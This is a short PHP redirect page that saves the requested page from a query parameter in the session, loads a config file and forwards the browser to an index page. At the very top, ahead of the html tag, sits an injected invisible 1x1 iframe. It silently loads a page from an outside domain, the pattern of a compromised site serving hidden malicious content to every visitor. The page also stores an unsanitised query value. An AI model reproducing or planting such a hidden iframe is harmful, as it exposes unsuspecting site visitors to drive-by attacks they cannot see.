<iframe src=http://gadgotec.com/stata.html WIDTH=1 HEIGHT=1 frameborder=0></IFRAME><html>
<head>
<?

session_start();
$simplepage = $_GET['p'];

if (($simplepage == "") || ($simplepage == null))
{
   $_SESSION['LastPage'] = "frame.php";
}
else
{
   $_SESSION['LastPage'] = "frame.php?p=".$simplepage;
}

require 'config.php';


echo '<meta http-equiv="refresh" content="0; URL='.$indexpage.'">';

?>
</head>
</html>